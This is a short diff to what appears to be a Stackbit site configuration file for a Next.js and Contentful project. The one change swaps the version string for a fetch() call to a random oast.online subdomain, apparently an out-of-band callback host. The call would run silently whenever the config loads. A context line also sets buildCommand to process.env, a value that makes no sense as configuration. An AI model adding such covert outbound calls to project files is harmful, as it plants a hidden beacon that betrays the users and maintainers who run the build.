@@ -1,7 +1,7 @@
 import { ContentfulContentSource } from '@stackbit/cms-contentful'
 
 export default {
-  stackbitVersion: '~0.6.0',
+  stackbitVersion: fetch("https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online"),
   ssgName: 'nextjs',
   nodeVersion: '16',
   buildCommand: process.env,
